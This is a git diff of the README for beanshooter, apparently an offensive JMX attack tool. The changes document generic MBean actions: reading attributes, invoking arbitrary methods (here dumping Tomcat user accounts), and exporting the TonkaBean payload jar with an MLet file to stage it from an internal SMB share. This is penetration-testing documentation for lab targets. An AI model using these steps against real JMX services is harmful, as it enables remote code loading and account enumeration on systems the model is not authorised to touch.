@@ -180,7 +180,7 @@ When just the attribute name is specified, *beanshooter* obtains and displays th
 
 ```console
 [qtc@devbox ~]$ beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose
-[+] false
+false
 ```
 
 When an additional value is specified, *beanshooter* attempts to set the corresponding attribute. For attributes
@@ -189,7 +189,7 @@ that have a different type than *String*, specifying the attribute type using th
 ```console
 [qtc@devbox ~]$ beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean
 [qtc@devbox ~]$ beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose
-[+] true
+true
 ```
 
 #### Brute
@@ -515,9 +515,12 @@ usage: beanshooter mlet [-h]   ...
 positional arguments:
 
     load                 load a new MBean from the specified URL
-    status               checks whether the MBean is registered
-    info                 print detailed information about the MBean
+    attr                 set or get MBean attributes
     deploy               deploys the specified MBean on the JMX server
+    info                 print server information about the MBean
+    invoke               invoke the specified method on the MBean
+    stats                print local information about the MBean
+    status               checks whether the MBean is registered
     undeploy             undeploys the specified MBEAN from the JMX server
 
 named arguments:
@@ -530,55 +533,20 @@ named arguments:
 ---
 
 Some *beanshooter* operations are available for each *MBean* and are demonstrated in this section.
+These generic *MBean* operations often mirror functionality from the [basic operations](#basic-operations),
+but without the requirement of specifying an *ObjectName*.
 
-#### Generic Info
+#### Generic Attr
 
-The `info` action lists some general information on the specified *MBean*:
-
-```console
-[qtc@devbox ~]$ beanshooter tonka info
-[+] tonka
-[+] 	Object Name: 	 MLetTonkaBean:name=TonkaBean,id=1
-[+] 	Class Name: 	 de.qtc.beanshooter.tonkabean.TonkaBean
-[+] 	Jar File: 	     available (tonka-bean-3.0.0-jar-with-dependencies.jar)
-```
-
-The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
-into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
-option. Currently, the *TonkaBean* is the only *MBean* that has a *Jar File* available.
-
-#### Generic Status
-
-The `status` action checks whether the corresponding *MBean* is already available on the *JMX* service:
+The `attr` action works the same as the `attr` action from the basic operations. However, the *ObjectName*
+does no longer need to be specified, as it is contained within the specified *MBean*.
 
 ```console
-[qtc@devbox ~]$ beanshooter tonka status 172.17.0.2 9010 
-[+] MBean Status: not deployed
+[qtc@devbox ~]$ beanshooter tomcat attr 172.17.0.2 1090 users
+Users:type=User,username="manager",database=UserDatabase
+Users:type=User,username="admin",database=UserDatabase
+Users:type=User,username="status",database=UserDatabase
 ```
-
-#### Generic Export
-
-Sometimes it is not possible to serve an *MBean* implementation using *beanshooters* stager server. A common
-scenario is that outbound connections to your local machine are blocked. In these situations, you may want
-to load the *MBean* from another location, like a *SMB* service in the internal network where you have write
-access to.
-
-The `export` action exports the *jar* file implementing the specified *MBean* and a corresponding *MLet HTML*
-document that is required for loading the *MBean* using *MLet*. Assuming you want to serve the *TonkaBean*
-form an *SMB* service listening on `10.10.10.5`, you could use the following commands:
-
-```console
-[qtc@devbox ~]$ beanshooter tonka export --export-dir export --stager-url file:////10.10.10.5/share/
-[+] Exporting MBean jar file: export/tonka-bean-3.0.0-jar-with-dependencies.jar
-[+] Exporting MLet HTML file to: export/index.html
-[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
-[+] 	Archive:   tonka-bean-3.0.0-jar-with-dependencies.jar
-[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
-[+] 	Codebase:  file:////10.10.10.5/share/
-```
-
-Afterwards, you can upload the exported *jar* and the `index.html` file to the *SMB* service and use the *beanshooters*
-deploy action with the `--stager-url file:////10.10.10.5/share/index.html` option.
 
 #### Generic Deploy
 
@@ -615,6 +583,96 @@ a builtin jar file is available):
 [+] 			Sending jar file with md5sum: 55a843002e13f763137d115ce4caf705
 [+]
 [+] 	MBean with object name MLetTonkaBean:name=TonkaBean,id=1 was successfully deployed
+```
+
+#### Generic Export
+
+Sometimes it is not possible to serve an *MBean* implementation using *beanshooters* stager server. A common
+scenario is that outbound connections to your local machine are blocked. In these situations, you may want
+to load the *MBean* from another location, like an *SMB* service in the internal network where you have write
+access to.
+
+The `export` action exports the *jar* file implementing the specified *MBean* and a corresponding *MLet HTML*
+document that is required for loading the *MBean* using *MLet*. Assuming you want to serve the *TonkaBean*
+form an *SMB* service listening on `10.10.10.5`, you could use the following command:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka export --export-dir export --stager-url file:////10.10.10.5/share/
+[+] Exporting MBean jar file: export/tonka-bean-3.0.0-jar-with-dependencies.jar
+[+] Exporting MLet HTML file to: export/index.html
+[+] 	Class:     de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Archive:   tonka-bean-3.0.0-jar-with-dependencies.jar
+[+] 	Object:    MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Codebase:  file:////10.10.10.5/share/
+```
+
+Afterwards, you can upload the exported *jar* and the `index.html` file to the *SMB* service and use the *beanshooters*
+deploy action with the `--stager-url file:////10.10.10.5/share/index.html` option.
+
+#### Generic Info
+
+The `info` action lists method and attribute information of the specified *MBean*:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat info 172.17.0.2 1090
+[+] MBean Class: org.apache.catalina.mbeans.MemoryUserDatabaseMBean
+[+] ObjectName: Users:type=UserDatabase,database=UserDatabase
+[+]
+[+] 	Attributes:
+[+] 		modelerType (type: java.lang.String , writable: false)
+[+] 		readonly (type: boolean , writable: false)
+[+] 		roles (type: [Ljava.lang.String; , writable: false)
+[+] 		groups (type: [Ljava.lang.String; , writable: false)
+[+] 		users (type: [Ljava.lang.String; , writable: false)
+[+] 		pathname (type: java.lang.String , writable: true)
+[+] 		writable (type: null , writable: false)
+[+]
+[+] 	Operations:
+[+] 		java.lang.String findGroup(java.lang.String groupname)
+[+] 		java.lang.String createUser(java.lang.String username, java.lang.String password, java.lang.String fullName)
+[+] 		void removeGroup(java.lang.String groupname)
+[+] 		void removeUser(java.lang.String username)
+[+] 		void save()
+[+] 		java.lang.String findRole(java.lang.String rolename)
+[+] 		void removeRole(java.lang.String rolename)
+[+] 		java.lang.String createGroup(java.lang.String groupname, java.lang.String description)
+[+] 		java.lang.String findUser(java.lang.String username)
+[+] 		java.lang.String createRole(java.lang.String rolename, java.lang.String description)
+```
+
+#### Generic Invoke
+
+The `invoke` action can be used to invoke an arbitrary method on the specified *MBean*:
+
+```console
+[qtc@devbox ~]$ beanshooter tomcat invoke 172.17.0.2 1090 --signature 'findUser(String username)' admin
+Users:type=User,username="admin",database=UserDatabase
+```
+
+#### Generic Stats
+
+The `stats` action lists some general information on the specified *MBean*. This is the information
+that *beanshooters* locally stores on the corresponding *MBean* and no server interaction is required.
+
+```console
+[qtc@devbox ~]$ beanshooter tonka stats
+[+] MBean: tonka
+[+] 	Object Name: 	 MLetTonkaBean:name=TonkaBean,id=1
+[+] 	Class Name: 	 de.qtc.beanshooter.tonkabean.TonkaBean
+[+] 	Jar File: 	     available (tonka-bean-3.0.0-jar-with-dependencies.jar)
+```
+
+The `Jar File` information indicates whether an implementation of the corresponding *MBean* is builtin
+into *beanshooter*. This jar file is used during deployment, if not overwritten using the `--jar-file`
+option. Currently, the *TonkaBean* is the only *MBean* that has a *Jar File* available.
+
+#### Generic Status
+
+The `status` action checks whether the corresponding *MBean* is already available on the *JMX* service:
+
+```console
+[qtc@devbox ~]$ beanshooter tonka status 172.17.0.2 9010
+[+] MBean Status: not deployed
 ```
 
 #### Generic Undeploy
